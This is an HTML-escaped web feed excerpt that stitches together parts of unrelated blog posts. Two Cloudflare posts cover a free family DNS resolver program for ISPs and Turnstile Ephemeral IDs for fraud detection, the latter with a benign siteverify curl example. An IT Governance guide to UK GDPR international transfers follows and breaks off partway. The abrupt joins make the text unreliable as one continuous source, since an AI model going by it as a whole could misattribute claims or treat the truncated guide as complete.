        &lt;p&gt;In 2018, Cloudflare &lt;a href="https://blog.cloudflare.com/announcing-1111/"&gt;&lt;u&gt;announced 1.1.1.1&lt;/u&gt;&lt;/a&gt;, one of the fastest, privacy-first consumer DNS services. 1.1.1.1 was the first consumer product Cloudflare ever launched, focused on reaching a wider audience. This service was designed to be fast and private, and &lt;a href="https://developers.cloudflare.com/1.1.1.1/privacy/public-dns-resolver/"&gt;&lt;u&gt;does not retain&lt;/u&gt;&lt;/a&gt; information that would identify who is making a request.&lt;/p&gt;&lt;p&gt;In 2020, Cloudflare &lt;a href="https://blog.cloudflare.com/introducing-1-1-1-1-for-families"&gt;&lt;u&gt;announced 1.1.1.1 for Families&lt;/u&gt;&lt;/a&gt;, designed to add a layer of protection to our existing 1.1.1.1 public resolver. The intent behind this product was to provide consumers, namely families, the ability to add a security and adult content filter to block unsuspecting users from accessing specific sites when browsing the Internet.&lt;/p&gt;&lt;p&gt;Today, we are officially announcing that any ISP and equipment manufacturer can use our DNS resolvers for free. Internet service, network, and hardware equipment providers can sign up and join this program to partner with Cloudflare to deliver a safer browsing experience that is easy to use, industry leading, and &lt;b&gt;at no cost to anyone&lt;/b&gt;.&lt;/p&gt;&lt;p&gt;Leading companies have already partnered with Cloudflare to deliver superior and customized offerings to protect their customers. By delivering this service in a place where the customer is familiar, you can help us make the Internet a safe place for all. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;A need to intentionally focus on families&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#a-need-to-intentionally-focus-on-families"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;COVID-19 presented new challenges beginning in 2020 as kids' online activity increased and the reliance on home networks was more present than ever before. Research shows around &lt;a href="https://www.pewresearch.org/internet/2020/07/28/childrens-engagement-with-digital-devices-screen-time/"&gt;&lt;u&gt;67% of adolescents&lt;/u&gt;&lt;/a&gt; have access to a tablet, with ages as low as two years old accessing media content. While it is often impressive to watch the ease with which a young child can navigate a smartphone or tablet handed to them and pull up their favorite YouTube show, it becomes increasingly concerning that kids may unintentionally stumble onto harmful content in the process.&lt;/p&gt;&lt;p&gt;Our launch of 1.1.1.1 for Families in 2020 provided that peace of mind to users around the globe, and it continues to deliver those protections. Today, households can set up this service using our &lt;a href="https://developers.cloudflare.com/1.1.1.1/setup/"&gt;&lt;u&gt;guide&lt;/u&gt;&lt;/a&gt;. They can select the DNS resolver they want to use, focusing on just privacy, or include blocking security threats and adult content across their entire home network.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/49EwOARWEuv8TfdzKdWpkc/bf53e440a69ae924ec09d806586ef567/image3.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;Although this service is available and free for anyone to use, there are still many users who browse online daily without protections in place. Setting up protection like this can feel daunting, and many users are at a loss on where to begin and/or how to configure this on their devices or home network. Today we are announcing a partnership that will make setup and configuration much easier for users.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Partnering to extend security even further &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#partnering-to-extend-security-even-further"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;ISPs and network providers can use Cloudflare’s different resolver services to provide various offerings to their customers. Our existing partners have taken these offerings and built them into their platforms as an extension of the services that they are already providing to their customers. This built-in model allows for easy adoption and a consistent and comprehensive end customer journey. Each service is designed with a specific purpose in mind, outlined below:&lt;/p&gt;&lt;p&gt;&lt;b&gt;Our core privacy resolver (1.1.1.1)&lt;/b&gt; is designed for speed and privacy.  Additionally, DNS requests to our public resolver can be sent over a secure channel using &lt;a href="https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/"&gt;&lt;u&gt;DNS over HTTPS (DoH)&lt;/u&gt;&lt;/a&gt; or &lt;a href="https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-tls/"&gt;&lt;u&gt;DNS over TLS (DoT)&lt;/u&gt;&lt;/a&gt;, significantly decreasing the odds of any unwanted spying or monster-in-the-middle attacks.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Our security resolver (1.1.1.2)&lt;/b&gt; has all the benefits of 1.1.1.1, with the additional benefit of protecting users from sites that contain malware, spam, botnet command and control attacks, or phishing threats.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Our family resolver (1.1.1.3)&lt;/b&gt; provides all the benefits of 1.1.1.2, with the additional benefit of blocking unwanted adult content from both direct site navigation, as well as locking public search engines to Safe Search only. This prevents anyone from unknowingly searching for something that might return an unwanted result. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Premium Safety &amp;amp; Customizations &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#premium-safety-customizations"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;If users want even more flexibility than what our public DNS resolvers provide, Cloudflare also offers a Gateway product that allows customized filtering, reporting, logging, analytics, and scheduling. This advanced &lt;a href="https://www.cloudflare.com/lp/ppc/cloudflare-gateway-x/?utm_source=google&amp;amp;utm_medium=cpc&amp;amp;utm_campaign=ao-fy-acq-namer_en_na-umbrella-ge-ge-prospecting-sch_g_brand_alpha&amp;amp;utm_content=Alpha_Brand_ZeroTrust_Gateway&amp;amp;utm_term=cloudflare+gateway&amp;amp;campaignid=71700000110566648&amp;amp;adgroupid=58700008395369395&amp;amp;creativeid=669303241127&amp;amp;&amp;amp;_bt=669303241127&amp;amp;_bk=cloudflare%20gateway&amp;amp;_bm=p&amp;amp;_bn=g&amp;amp;_bg=152212903387&amp;amp;_placement=&amp;amp;_target=&amp;amp;_loc=9194681&amp;amp;_dv=c&amp;amp;awsearchcpc=1&amp;amp;gad_source=1&amp;amp;gclid=CjwKCAjw5qC2BhB8EiwAvqa41kCNIRA_o0KDeWYAgS3YmHunP3DCtEEkHlHM-lzAe02tb5kOLvdhVxoCFAUQAvD_BwE&amp;amp;gclsrc=aw.ds"&gt;&lt;u&gt;Gateway&lt;/u&gt;&lt;/a&gt; offering includes over &lt;a href="https://developers.cloudflare.com/cloudflare-one/policies/gateway/domain-categories/"&gt;&lt;u&gt;114 categories&lt;/u&gt;&lt;/a&gt; ranging from social media, online messaging platforms, gaming, and &lt;a href="https://developers.cloudflare.com/cloudflare-one/policies/gateway/dns-policies/#safe-search"&gt;&lt;u&gt;“safe search” results&lt;/u&gt;&lt;/a&gt;, all the way to “home &amp;amp; garden”.&lt;/p&gt;&lt;p&gt;The additional filters and scheduling functionality empowers users to exercise more nuanced and time-based controls, such as limiting social media during school hours or dinner time. &lt;/p&gt;&lt;p&gt;If you are an ISP or equipment manufacturer looking to provide easily customizable options for your customers, this is also an available option. We have a multi-tenant environment available for our Gateway offering that enables our customers to empower their individual subscribers to configure their own individual filters for their users and homes. If you are a device manufacturer or ISP looking to offer customizable protections for your individual subscribers, this may be a good option for you.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Our continued commitment to privacy, security, and safety&lt;/h2&gt;

          &lt;/div&gt;
        &lt;p&gt;Simply put, Cloudflare is an easy and obvious choice for protecting individuals and families. This is why leading companies have all chosen to partner with Cloudflare to help protect customers and their families. In 2020, after launching &lt;a href="https://developers.cloudflare.com/1.1.1.1/setup/#1111-for-families"&gt;&lt;u&gt;1.1.1.1 for Families&lt;/u&gt;&lt;/a&gt;, we were serving 200+ billion DNS queries per day for 1.1.1.1. Today, we serve 1.7 trillion queries per day for 1.1.1.1 and &lt;a href="https://www.cloudflare.com/network/"&gt;&lt;u&gt;our network presence spans over 330 cities and interconnects with over 12,500+ other networks&lt;/u&gt;&lt;/a&gt;. It is this network that puts us within a blink of an eye for 95% of the world's Internet-connected population (your customers), ensuring they receive lightning fast speed while browsing.&lt;/p&gt;&lt;p&gt;Beyond our speed, Cloudflare is used as a reverse proxy by &lt;a href="https://w3techs.com/technologies/overview/proxy/all"&gt;&lt;u&gt;nearly ~ 20% of all websites&lt;/u&gt;&lt;/a&gt; across the globe. &lt;a href="https://radar.cloudflare.com/"&gt;&lt;u&gt;This gives us incredible insight to the latest Internet trends, threats, and research&lt;/u&gt;&lt;/a&gt;. In partnering with us, you can leverage our strengths — powerful infrastructure, extensive data insights, and a dedicated threat intelligence team - while focusing on your core priorities.  There is no better partner to have than one who provides global reach, excellent performance, and &lt;a href="https://developers.cloudflare.com/1.1.1.1/privacy/public-dns-resolver/"&gt;&lt;u&gt;built-in privacy&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

Introducing Ephemeral IDs — a new dimension in detecting fraudulent activity, bot or human, that links behavior to a specific client instead of an IP address. This makes Turnstile better for everyone, everywhere.</description><content:encoded>&lt;p&gt;In the early days of the Internet, a single IP address was a reliable indicator of a single user. However, today’s Internet is more complex. Shared IP addresses are now common, with users connecting via mobile IP address pools, VPNs, or behind &lt;a href="https://en.wikipedia.org/wiki/Carrier-grade_NAT"&gt;&lt;u&gt;CGNAT (Carrier Grade Network Address Translation)&lt;/u&gt;&lt;/a&gt;. This makes relying on IP addresses alone a weak method to combat modern threats like automated attacks and fraudulent activity. Additionally, many Internet users have no option but to use an IP address which they don’t have sole control over, and as such, &lt;a href="https://blog.cloudflare.com/consequences-of-ip-blocking/"&gt;&lt;u&gt;should not be penalized for that&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;At Cloudflare, we are solving this complexity with &lt;a href="https://developers.cloudflare.com/turnstile/"&gt;&lt;u&gt;Turnstile&lt;/u&gt;&lt;/a&gt;, our &lt;a href="https://blog.cloudflare.com/turnstile-private-captcha-alternative/"&gt;&lt;u&gt;CAPTCHA alternative&lt;/u&gt;&lt;/a&gt;. And now, we’re taking the next step in advancing security with Ephemeral IDs, a new feature that generates a unique short-lived ID, without relying on any network-level information.&lt;/p&gt;&lt;p&gt;When a website visitor interacts with Turnstile, we now calculate an Ephemeral ID that can link behavior to a specific client instead of an IP address. This means that even when attackers rotate through large pools of IP addresses, we can still identify and block malicious actions. For example, in attacks like &lt;a href="https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/"&gt;&lt;u&gt;credential stuffing&lt;/u&gt;&lt;/a&gt; or account signups, where fraudsters attempt to disguise themselves using different IP addresses, Ephemeral IDs allow us to detect abuse patterns more accurately beyond just determining whether the visitor is a human or a bot. Multiple fraudulent actions from the same client are grouped together, improving our detection rate while reducing false positives.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How Ephemeral IDs work&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-ephemeral-ids-work"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Turnstile detects bots by analyzing browser attributes and signals. Using these aggregated client-side signals, we generate a short-lived Ephemeral ID without setting any cookies or using similar client-side storage. These IDs are intentionally not 100% unique and have a brief lifespan, making them highly effective in identifying patterns of fraud and abuse, without compromising user privacy.&lt;/p&gt;&lt;p&gt;When the same visitor interacts with Turnstile widgets from different Cloudflare customers, they receive different Ephemeral IDs for each one. Additionally, because these IDs change frequently, they cannot be used to track a single visitor over multiple days.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2uGotegS95KA9Ea5qRsQgs/71f01ce9c9a8096e7c64cdfc470ddeb0/BLOG-2548_2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sub&gt;&lt;i&gt;Blue: A single IP address | Green: A single Ephemeral ID&lt;/i&gt;&lt;/sub&gt;&lt;sub&gt;
&lt;/sub&gt;&lt;sub&gt;&lt;i&gt;The bigger the node, the more frequently seen that ID or IP address was in our dataset.&lt;/i&gt;&lt;/sub&gt;&lt;/p&gt;&lt;p&gt;The graphic above illustrates the complex reality of the modern Internet, where the relationship between clients and IP addresses is far from a simple one-to-one mapping. While some straightforward mappings still exist, they are no longer the norm.&lt;/p&gt;&lt;p&gt;During a period where a site or service is under attack, we observe a “nest” of highly correlated Ephemeral IDs. In the example below, the correlation is based on both Ephemeral ID and IP address.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5Rk4QXW1nkrrIk46XgzXdA/52739f21e6a00643a511de77b47142f1/BLOG-2548_3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sub&gt;&lt;i&gt;Nest in the center of the diagram visualizes thousands of IP addresses (blue) which are correlated by the commonly identified Ephemeral IDs (green). The bigger the node, the more frequently seen that ID or IP address was in our dataset.&lt;/i&gt;&lt;/sub&gt;&lt;/p&gt;&lt;p&gt;This is real-world data showing fraudulent activity on one of Cloudflare’s public-facing forms. Even with access to a broad range of IP addresses, attackers struggle to completely disguise their requests because Ephemeral IDs are generated based on patterns beyond IP addresses. This means that even if they rotate addresses, the underlying client characteristics are still detected, making it harder for them to evade our security measures. This makes it easier for us to group these requests and apply appropriate business logic, whether that means discarding the requests, requiring further validation, enforcing &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-multi-factor-authentication/"&gt;&lt;u&gt;multi-factor authentication (MFA)&lt;/u&gt;&lt;/a&gt;, or other actions. &lt;/p&gt;&lt;p&gt;This new client identification technology seamlessly integrates into the broader advancements we’ve made to Turnstile over the past year. Whether you’re protecting &lt;a href="https://developers.cloudflare.com/turnstile/tutorials/login-pages/"&gt;&lt;u&gt;login forms&lt;/u&gt;&lt;/a&gt;, signup pages, or high value transactions, you’ll immediately benefit from this extra layer of abuse detection &lt;b&gt;without needing to change a single line of code&lt;/b&gt;. We’ll take care of all the heavy lifting and analysis behind the scenes, and our system will continue to improve its accuracy and effectiveness over time.&lt;/p&gt;&lt;p&gt;What does this mean for you? Starting today, &lt;a href="https://www.cloudflare.com/products/turnstile/"&gt;&lt;u&gt;Turnstile&lt;/u&gt;&lt;/a&gt; will go beyond just identifying bots. &lt;b&gt;All&lt;/b&gt; &lt;b&gt;websites protected by Turnstile will automatically benefit&lt;/b&gt; from the integration of Ephemeral IDs into our detection logic. This means we can more effectively identify and penalize offending clients without impacting other users on the same network, or IP address, improving security and user experience for everyone.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Ephemeral IDs in action&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#ephemeral-ids-in-action"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Everyone benefits from the addition of Ephemeral IDs to the Challenge Platform, but for those who want to use it beyond that, the Ephemeral ID is available through the Turnstile &lt;a href="https://developers.cloudflare.com/turnstile/get-started/server-side-validation/"&gt;&lt;u&gt;siteverify&lt;/u&gt;&lt;/a&gt; response. A practical use case for Ephemeral IDs is preventing fraudulent account signups. Imagine a bad actor, a real person using a real device, creating hundreds of fake accounts while rotating IP addresses to avoid detection. By ingesting Ephemeral IDs and logging them alongside your account creation logs, you can set up alerts based on account creation thresholds in real-time or retroactively investigate suspicious activity. Even though Ephemeral IDs are short-lived and may have changed by the time an investigation begins, they still provide valuable insights through aggregate analysis, and provide an extra dimension to identify fraud and abuse.&lt;/p&gt;&lt;p&gt;For our &lt;b&gt;Turnstile Enterprise &lt;/b&gt;and&lt;b&gt; Bot Management Enterprise &lt;/b&gt;customers, you now have the option to access Ephemeral IDs directly through the Turnstile siteverify response. Get in touch with your Account Executive to enable it on your account.&lt;/p&gt;&lt;p&gt;Below is an example of &lt;a href="https://developers.cloudflare.com/turnstile/get-started/server-side-validation/"&gt;&lt;u&gt;siteverify&lt;/u&gt;&lt;/a&gt; response for those who have enabled Ephemeral IDs.&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;curl 'https://challenges.cloudflare.com/turnstile/v0/siteverify' --data 'secret=verysecret&amp;amp;response=&amp;lt;RESPONSE&amp;gt;'&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr"&gt;A Guide to GDPR International Transfers&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance UK Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;7 mechanisms you can rely on for restricted transfers&lt;/h2&gt;



&lt;p&gt;The &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;UK GDPR (General Data Protection Regulation)&lt;/a&gt; offers a high standard of data protection – but its scope is limited to organisations based or operating in the UK.&lt;/p&gt;



&lt;p&gt;So, what happens if you transfer the personal data outside the country?&lt;/p&gt;



&lt;p&gt;The GDPR requires UK residents’ data to be offered the &lt;em&gt;same&lt;/em&gt; level of protection, whether processed at home or abroad.&lt;/p&gt;



&lt;p&gt;How? By demanding that organisations put adequate safeguards in place for ‘restricted transfers’ of personal data.&lt;/p&gt;



&lt;p&gt;This blog explains what restricted transfers are, and the safeguards you’re allowed to rely on under the UK GDPR. I’ll also touch on the EU GDPR, where appropriate.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this guide&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#restricted-transfer"&gt;What restricted transfers are&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-1"&gt;Mechanism #1: Adequacy decisions&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-2"&gt;Mechanism #2: IDTA (international data transfer agreement)&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-3"&gt;Mechanism #3: BCRs (binding corporate rules)&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-4"&gt;Mechanism #4: Codes of conduct&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-5"&gt;Mechanism #5: Certification&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-6"&gt;Mechanism #6: Derogations&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-7"&gt;Mechanism #7: Compelling legitimate interest&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#how-to-choose"&gt;How to choose the right mechanism&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="restricted-transfer"&gt;What is a ‘restricted transfer’ under the UK GDPR?&lt;/h2&gt;



&lt;p&gt;To send personal data outside the UK – i.e. to make a ‘restricted transfer’ – data controllers and processors must provide an adequate level of security to protect:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The personal data being processed; and&lt;/li&gt;



&lt;li&gt;The rights and freedoms of data subjects.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Organisations subject to the UK GDPR must also consider relevant laws of the countries involved, and prevent the personal data from being accessed by other entities* without the data subject’s knowledge.&lt;/p&gt;



&lt;p&gt;There are three conditions for the transfer to be considered ‘restricted’ under the UK GDPR:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;The personal data you want to transfer is subject to the UK GDPR.&lt;/li&gt;



&lt;li&gt;You’re initiating and agreeing to send personal data to (or make it available to) a recipient outside the UK.&lt;/li&gt;



&lt;li&gt;The recipient is a separate, legally distinct organisation (or individual) from you.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Restricted transfers can include Cloud storage, automated systems for data processing, and even analytics providers.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;*These ‘other entities’ include law enforcement agencies, which are more prone to accessing people’s data under local national laws. For example, the FBI uses FISA Section 702 to collect ‘foreign intelligence information’ from non-US residents.&lt;/em&gt;&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;How different is that from the EU GDPR?&lt;/h3&gt;



&lt;p&gt;The requirements are broadly the same, but looking at it from an EEA rather than a UK perspective:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The data controller/processor linked to processing activity is subject to the EU GDPR.&lt;/li&gt;



&lt;li&gt;The controller/processor transfers the data, or makes it available to, another organisation.&lt;/li&gt;



&lt;li&gt;That organisation is outside the EEA, or it’s an international organisation.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Let’s look at seven mechanisms for international personal data transfers under the UK and, where applicable, EU GDPR.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-1"&gt;Mechanism #1: Adequacy decisions&lt;/h2&gt;



&lt;p&gt;Relying on an &lt;strong&gt;adequacy decision&lt;/strong&gt; is usually the easiest safeguard to rely on for international transfers.&lt;/p&gt;



&lt;p&gt;The UK’s &lt;strong&gt;adequacy regulations&lt;/strong&gt; grant countries or territories deemed to provide ‘adequate’ protection to personal data, and to data subjects’ rights and freedoms, an adequacy decision.&lt;/p&gt;



&lt;p&gt;That means personal data may flow freely between the UK and these ‘adequate’ countries. The EU GDPR offers an equivalent mechanism under Article 45 (‘transfers on the basis of an adequacy decision’).&lt;/p&gt;



&lt;p&gt;Under the UK GDPR’s adequacy regulations, the EEA and all countries with an adequacy decision under the EU GDPR are covered. These are:&lt;/p&gt;



&lt;ul class="wp-block-list multi-column"&gt;
&lt;li&gt;Andorra&lt;/li&gt;



&lt;li&gt;Argentina&lt;/li&gt;



&lt;li&gt;Austria&lt;/li&gt;



&lt;li&gt;Belgium&lt;/li&gt;



&lt;li&gt;Bulgaria&lt;/li&gt;



&lt;li&gt;Croatia&lt;/li&gt;



&lt;li&gt;Cyprus&lt;/li&gt;



&lt;li&gt;Czech Republic&lt;/li&gt;



&lt;li&gt;Denmark&lt;/li&gt;



&lt;li&gt;Estonia&lt;/li&gt;



&lt;li&gt;Faroe Islands&lt;/li&gt;



&lt;li&gt;Finland&lt;/li&gt;



&lt;li&gt;France&lt;/li&gt;



&lt;li&gt;Germany&lt;/li&gt;



&lt;li&gt;Gibraltar&lt;/li&gt;



&lt;li&gt;Greece&lt;/li&gt;



&lt;li&gt;Guernsey&lt;/li&gt;



&lt;li&gt;Hungary&lt;/li&gt;



&lt;li&gt;Iceland&lt;/li&gt;



&lt;li&gt;Ireland&lt;/li&gt;



&lt;li&gt;Isle of Man&lt;/li&gt;



&lt;li&gt;Israel&lt;/li&gt;



&lt;li&gt;Italy&lt;/li&gt;



&lt;li&gt;Jersey&lt;/li&gt;



&lt;li&gt;Latvia&lt;/li&gt;



&lt;li&gt;Liechtenstein&lt;/li&gt;



&lt;li&gt;Lithuania&lt;/li&gt;



&lt;li&gt;Luxembourg&lt;/li&gt;



&lt;li&gt;Malta&lt;/li&gt;



&lt;li&gt;Netherlands&lt;/li&gt;



&lt;li&gt;New Zealand&lt;/li&gt;



&lt;li&gt;Norway&lt;/li&gt;



&lt;li&gt;Poland&lt;/li&gt;



&lt;li&gt;Portugal&lt;/li&gt;



&lt;li&gt;Romania&lt;/li&gt;



&lt;li&gt;Slovakia&lt;/li&gt;



&lt;li&gt;Slovenia&lt;/li&gt;



&lt;li&gt;South Korea&lt;/li&gt;



&lt;li&gt;Spain&lt;/li&gt;



&lt;li&gt;Sweden&lt;/li&gt;



&lt;li&gt;Switzerland&lt;/li&gt;



&lt;li&gt;Uruguay&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In addition, Canada, Japan and the &lt;a href="https://www.itgovernance.co.uk/blog/expert-insight-andrew-snow" rel="noreferrer noopener" target="_blank"&gt;US&lt;/a&gt; have received partial adequacy decisions under both the UK and EU GDPR.&lt;/p&gt;



&lt;p&gt;Also note that personal data can flow freely between public authorities internationally.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;What about Brexit?&lt;/h3&gt;



&lt;p&gt;When it comes to international transfers, we’ve only seen one meaningful change in recent years: &lt;a href="https://www.itgovernance.co.uk/blog/expert-insight-andrew-snow" rel="noreferrer noopener" target="_blank"&gt;Schrems II&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Though there &lt;em&gt;are&lt;/em&gt; differences between the UK and EU GDPR, of course, for transfers to third countries, little has changed because of the mutual adequacy decision.&lt;/p&gt;



&lt;p&gt;Put differently, personal data may flow freely between the UK and EU/EEA. And since the remaining countries with adequacy decisions are identical for the UK and EU GDPR, little has changed.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-2"&gt;Mechanism #2: International data transfer agreement&lt;/h2&gt;



&lt;p&gt;Under the EU GDPR, we had the SCCs (standard contractual clauses). After the EU updated them, the UK ICO (Information Commissioner’s Office) updated its equivalent mechanism to the &lt;strong&gt;IDTA: international data transfer agreement&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Organisations subject to the UK GDPR must now use the IDTA, as the transition period ended in March 2024.&lt;/p&gt;



&lt;p&gt;The idea for both the EU SCCs and UK IDTA is that they’re model contractual clauses, available on the &lt;a href="https://commission.europa.eu/law/law-topic/data-protection/international-dimension-data-protection/standard-contractual-clauses-scc_en" rel="noreferrer noopener" target="_blank"&gt;European Commission&lt;/a&gt; and &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/international-data-transfer-agreement-and-guidance/" rel="noreferrer noopener" target="_blank"&gt;ICO&lt;/a&gt; websites respectively. If you use them without change, they should comply with the &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-28-contracts-what-you-need-to-know" rel="noreferrer noopener" target="_blank"&gt;Article 28 requirements&lt;/a&gt; of the EU and UK GDPR.&lt;/p&gt;



&lt;p&gt;More specifically, you complete the first 8 pages the IDTA. The remaining 28 pages are all the mandatory clauses you cannot amend nor remove.&lt;/p&gt;



&lt;p&gt;You &lt;em&gt;can&lt;/em&gt;, however, add more clauses, but these may not change or take away from the meaning of the pre-written text.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Remember the transfer risk assessment tool!&lt;/h3&gt;



&lt;p&gt;Many people overlook the TRA (transfer risk assessment) tool – a 41-page risk assessment also on the &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/international-data-transfer-agreement-and-guidance/" rel="noreferrer noopener" target="_blank"&gt;ICO website&lt;/a&gt; – which sits alongside the IDTA.&lt;/p&gt;



&lt;p&gt;This TRA is designed to tell you whether you can go ahead with the international transfer of personal data in question.&lt;/p&gt;



&lt;p&gt;Like any other &lt;a href="https://www.itgovernance.co.uk/blog/why-risk-assessments-are-essential-for-gdpr-compliance." rel="noreferrer noopener" target="_blank"&gt;risk assessment&lt;/a&gt;, you must determine the level of risk, and decide whether it’s acceptable as-is, or requires treatment to bring it down to an acceptable level. You must also include them on your risk register.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-3"&gt;Mechanism #3: Binding corporate rules&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;BCRs (binding corporate rules) &lt;/strong&gt;under both the UK and EU GDPR are for international organisations.&lt;/p&gt;



&lt;p&gt;Suppose you have offices in the UK, Australia and mainland China. If you took the IDTA/SCC approach here, you’d need &lt;em&gt;six&lt;/em&gt; contracts (and risk assessments), just to have the free flow of personal data between all entities.&lt;/p&gt;



&lt;p&gt;That’s where the BCRs come in. These rules allow all entities involved within a global organisation to have data flow freely between all entities within it.&lt;/p&gt;



&lt;p&gt;In effect, the BCRs are a contract that, like the IDTA, covers the requirements of Article 28, but the ICO (or, for the EU GDPR, your supervisory authority) must sign it off. &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/guide-to-binding-corporate-rules/a-uk-bcr-addendum/" rel="noreferrer noopener" target="_blank"&gt;Its website&lt;/a&gt; has more information about the application process.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;That’s for the GDPR. What about international privacy laws?&lt;/h3&gt;



&lt;p&gt;Using my earlier example again, Australia and mainland China each have their own national laws, as do most countries around the world. So, your BCRs must reference the Australian Privacy Act and the Chinese Personal Information Protection Law.&lt;/p&gt;



&lt;p&gt;However, when dealing with international organisations, you &lt;em&gt;can&lt;/em&gt; get complications on the other (non-UK/EU) side.&lt;/p&gt;



&lt;p&gt;For example, I remember doing some GDPR work for a large Saudi Arabian organisation. A national law prevented it from being allowed to report data breaches with a risk to data subjects outside the country.&lt;/p&gt;



&lt;p&gt;For clarity: it may &lt;a href="https://www.itgovernance.co.uk/green-papers/data-breach-survival-guide" rel="noreferrer noopener" target="_blank"&gt;report data breaches&lt;/a&gt; to the local authorities, but not internationally. And where you have competing laws, the strictest always applies.&lt;/p&gt;



